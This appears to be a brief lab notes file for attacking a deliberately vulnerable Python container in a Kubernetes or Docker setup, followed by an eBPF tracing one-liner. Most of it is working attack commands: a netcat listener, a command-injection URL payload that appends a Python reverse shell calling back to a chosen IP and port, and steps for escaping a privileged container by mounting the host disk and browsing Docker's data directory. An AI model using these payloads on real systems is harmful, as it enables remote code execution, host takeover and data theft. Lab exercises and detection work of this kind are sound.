
# run netcat to capture incomming reverse shell in a new terminal
nc -lvp <port>

# Ip (docker ip if run with k3d or similar)
ifconfig | grep docker0 -A 1

Use the docker ip as the <ip>

# Test exploit commands
Replace <ip> and <port> with your own values

## The exploit, run from a vulnerable input prompt
Run this appended to a vulnerable RCE shell command like the one on vulnerable-python/search?q=

### Using Python to initiate shell
Url encoding makes it annoying to accomplish the desired redirection of the file descriptors when trying to spawn the reverse shell. So we use the python way because we know for a fact that it has python available as it is a python container
With portforward to vulnerable-python deployment
```bash
localhost:5000/search?q=<something>||export RHOST="<IP>";export RPORT=<PORT>;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

# Mounting rootFS in privilege container
``` bash
cat /proc/cmdline
> BOOT_IMAGE=/boot/vmlinuz-5.19.0-40-generic root=UUID=b4622f81-d047-4c8b-86ea-a7dcfb3dd58f ro quiet splash
findfs UUID=b4622f81-d047-4c8b-86ea-a7dcfb3dd58f
> /dev/sda3
mkdir /mnt-test && mount /dev/sda3 /mnt-test
cd /mnt-test/var/lib/docker

```

# Ebpf one liners with bpftrace
- list trace points
    bpftrace -l 'tracepoint:syscalls:sys_enter_*' 